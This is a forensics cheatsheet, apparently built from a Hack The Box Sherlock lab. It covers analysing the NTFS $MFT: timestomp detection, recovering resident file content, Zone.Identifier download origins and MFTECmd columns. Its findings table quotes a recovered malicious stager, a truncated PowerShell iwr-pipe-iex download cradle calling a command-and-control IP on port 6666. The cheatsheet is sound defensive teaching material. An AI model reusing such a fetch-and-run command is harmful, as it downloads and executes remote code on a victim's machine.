# Cheatsheet — MFT Forensics ($MFT analysis)

Quick reference for analysing the NTFS Master File Table, built from the HTB Sherlock **BFT** (a delivery + stager case solved entirely from the `$MFT`). The MFT is a record of **every file** on an NTFS volume — and, crucially, it stores the **content** of small files inline. Parsed with **MFTECmd**, analysed in **Timeline Explorer**.

Lab context: HTB Sherlock. Paths, hashes, IPs, and URLs are training data.

---

## 1. What the MFT is (and why it's powerful)

Every file on an NTFS volume has a record in the `$MFT`. Each record holds the file's metadata across several attributes — and for **small files, the file's data lives inside the record itself** (resident data). This means the MFT can reveal:

- Files that **no longer exist** (the record persists until overwritten).
- The **content** of small files (scripts, notes, config) even if the file wasn't collected.
- **Timestamp tampering** (via two independent timestamp sets).
- **Origin metadata** (download source via the `Zone.Identifier` ADS).

Parse it with:
```
MFTECmd.exe -f "<triage>\C\$MFT" --csv <out> --csvf mft.csv
```
Note the **single quotes** in PowerShell around a path ending in `$MFT`, or the `$MFT` is read as a variable.

---

## 2. The two timestamp sets — $SI vs $FN (timestomping)

Each MFT record carries **two** sets of MACB timestamps:

| Attribute | Column in MFTECmd | Who writes it |
|-----------|-------------------|---------------|
| **`$STANDARD_INFORMATION`** (`$SI`) | `Created0x10`, etc. | User-modifiable — **timestomping tools change THIS** |
| **`$FILE_NAME`** (`$FN`) | `Created0x30`, etc. | Kernel-only — much harder to forge |

**The tell:** if `$SI` creation time is **older** than `$FN` creation time, the file was **timestomped** — a tool backdated the visible ($SI) timestamp, but the ($FN) one set by the kernel gives away the real creation. `$FN` earlier than `$SI` is normal; `$SI` earlier than `$FN` is the red flag.

**Rule:** when a timestamp looks suspicious, compare `Created0x10` vs `Created0x30`. Trust `$FN` (0x30) as the truer creation time.

---

## 3. Resident data — the content lives in the MFT

If a file's data is small (roughly < 700–800 bytes), NTFS stores it **resident** — inline in the MFT record, not in a separate cluster. Consequences:

- A small malicious script (`.bat`, `.cmd`, a note) can be **recovered from the raw `$MFT`** even if the file itself is gone or was never collected by the triage tool.
- Recover it by string-searching the raw `$MFT`:
  ```
  # ASCII content
  findstr /i "pattern" "<triage>\C\$MFT"
  # UTF-16 content (ransom notes, messages are often Unicode)
  Select-String -Path "<triage>\C\$MFT" -Pattern 'pattern' -Encoding Unicode
  ```

**Critical encoding lesson:** small text files are frequently stored in **UTF-16**. Plain `findstr` reads ASCII and **silently skips** the Unicode content. Always search the `$MFT` in **both** ASCII and Unicode — a message can be sitting there invisibly to an ASCII-only search.

---

## 4. Zone.Identifier — where a file came from (MOTW)

When a file is downloaded, Windows attaches a **`Zone.Identifier`** Alternate Data Stream (the Mark-of-the-Web) recording its origin. This ADS has its own MFT record and often survives:

- It contains `ZoneId=3` (internet) and frequently the **`HostUrl`** — the exact download URL.
- Recoverable from the MFT even after the file is deleted, because the ADS record persists.

**Key literal recovered (BFT):**
```
ZIP:      Stage-20240213T093324Z-001.zip   (from Google Drive)
HostUrl:  https://storage.googleapis.com/drive-bulk-export-anonymous/
          20240213T093324.039Z/.../c277a8b4-...?authuser
```
— recovered from the ZIP's own `Zone.Identifier` MFT record.

---

## 5. Key literals & the offset lesson (BFT)

| Finding | Value |
|---------|-------|
| Delivered archive | `Stage-20240213T093324Z-001.zip` (Google Drive) |
| Download source | `storage.googleapis.com` (living-off-trusted-services) |
| Stager path | `C:\Users\simon.stark\Downloads\Stage-...\Stage\invoice\invoices\invoice.bat` |
| MFT entry number | `23436` |
| Hex offset of the record | **`0x16E3000`** (entry 23436 × 1024 bytes/record) |
| Resident `$DATA` (the stager) | `powershell ... iwr('http://43.204.110.203:6666/download/powershell/...')|iex` |
| C2 | `43.204.110.203:6666` |

**Offset arithmetic.** Each MFT record is **1024 bytes**. To locate a record's byte offset in the raw `$MFT`:
```
offset = EntryNumber × 1024
23436 × 1024 = 23,998,464 = 0x16E3000
```
Useful when you want to jump straight to a record in a hex editor (HxD) to read its resident data or raw attributes.

**The finding:** `invoice.bat` was a tiny file, so its malicious `$DATA` (a PowerShell downloader with the C2) was **resident in the MFT** — recovered without the file existing on disk. Same principle as recovering a ransom note from the `$MFT`.

---

## 6. Useful MFTECmd / Timeline Explorer columns

| Column | Use |
|--------|-----|
| `EntryNumber` | Unique record ID — the pivot; also gives the hex offset (×1024) |
| `ParentPath` / `FileName` | Where the file lives / its name |
| `Extension` | Filter by type — but don't rely on it alone; attackers rename |
| `Created0x10` / `Created0x30` | `$SI` vs `$FN` creation — the timestomp comparison |
| `IsDirectory` | Distinguish files from folders |
| `FileSize` | Small size (< ~800 B) hints at resident data |
| `SI<FN` flag | Some parsers flag the timestomp condition directly |

**Filtering tip:** extension + date + parent path together isolate an artifact fast — e.g. `Created0x30 = <incident date>` + `ParentPath contains Users\<user>`. But when filtering by extension fails, **don't guess variants** — the file may be renamed or the content resident; go to the raw `$MFT` string search instead.

---

## 7. Attack → detection mapping

| Attacker action | MFT signal | Where to look |
|-----------------|-----------|----------------|
| Downloaded a payload | `Zone.Identifier` ADS with `HostUrl` | ADS record for the file |
| Backdated a file (timestomp) | `$SI` creation < `$FN` creation | `Created0x10` vs `Created0x30` |
| Dropped a tiny script | Resident `$DATA` in the record | raw `$MFT` string search (ASCII **and** Unicode) |
| Deleted the evidence | Record persists until overwritten | the MFT still lists it / holds its content |
| Left a note / ransom message | Resident text in a small-file record | `Select-String -Encoding Unicode` on `$MFT` |

---

## 8. Golden rule

**The MFT does not just list files — it contains the content of small ones, remembers deleted ones, and records their true timestamps and origin.** When a small text artifact (script, note, config) is expected but absent from the triage, search the raw `$MFT` in both ASCII and Unicode before concluding it's gone. Trust `$FN` (0x30) over `$SI` (0x10) for creation time, and read the `Zone.Identifier` for where a file came from.
